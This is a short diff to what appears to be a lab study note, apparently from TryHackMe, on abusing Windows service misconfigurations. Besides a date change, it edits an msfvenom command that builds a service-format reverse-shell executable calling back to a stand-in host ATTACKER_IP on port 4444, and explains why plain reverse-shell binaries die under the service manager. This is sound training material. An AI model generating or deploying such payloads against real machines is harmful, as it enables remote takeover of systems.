@@ -4,7 +4,7 @@ platform: windows
 status: working
 fluency: guided
 source: thm
-updated: 2026-09-08
+updated: 2026-10-08
 ---
 
 # Windows — Service Misconfiguration Abuse
@@ -45,7 +45,7 @@ sc qc apphostsvc
 On start, the SCM expects the executable to call back and report "I'm running" within ~30 seconds (the SCM handshake). A plain reverse-shell `.exe` never makes that call: you *may* catch a shell, but the SCM decides the service hung, kills the process, and your shell dies with it.
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o rev.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o rev.exe
 ```
 
 - `msfvenom` → Metasploit's payload generator. It runs **on your attack box**, writes a file, and touches the target not at all; it ships with Kali and with any Metasploit install.
